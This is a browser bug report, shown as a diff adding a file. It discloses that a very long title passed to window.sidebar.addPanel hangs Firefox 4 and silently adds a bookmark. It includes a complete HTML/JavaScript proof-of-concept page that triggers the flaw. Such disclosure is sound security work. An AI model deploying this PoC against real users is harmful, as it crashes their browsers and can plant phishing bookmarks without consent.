@@ -1,0 +1,56 @@
+Adding a bookmark with a long title cause a hang
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0) Gecko/20100101 Firefox/4.0
+Build Identifier: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0) Gecko/20100101 Firefox/4.0
+
+It is possible to open the "Add to Bookmark" dialog with JavaScript:
+window.sidebar.addPanel(title, url, "");
+but this function isn't safe at the moment.
+
+If the inserted "title" is really long (look at my example, where a long title is generated), the browser will crash and add the url to your bookmark without showing the dialog and accepting it. This can be used to add a link which lead to an "modified" online banking Site / phishing site or any other bad site.
+
+This can be probably used to insert malicious code.
+
+Reproducible: Always
+
+Steps to Reproduce:
+1.Click on a Link (which ha a javascript function on it for bookmarking a site --> window.sidebar.addPanel(title, url, "");)
+2.Title is a really long String
+3.Click on the link with the javascript
+
+Actual Results:
+The Browser crashes, because he cant handle the long input and the site defined in "url" will be added to the bookmark (without accepting it)
+
+Expected Results:
+Check that the inserted title isnt that long and dont add the bookmark without accepting it.
+
+Here is the Code for testing this:
+
+<html>
+<head>
+<title>
+Testpage
+</title>
+</head>
+<body>
+<script type="text/javascript">
+function bookmark(){
+
+var title = "BadDomain";
+var url = "http://google.com";
+
+var count = 23;
+for(var i = 0; i < count; i++){
+title = title + title;
+}
+
+//if Firefox
+if (window.sidebar)
+window.sidebar.addPanel(title, url, "");
+}
+</script>
+
+
+<a href="javascript:bookmark()">Bookmark the Site described without accepting it!</a>
+
+</body>
+</html>
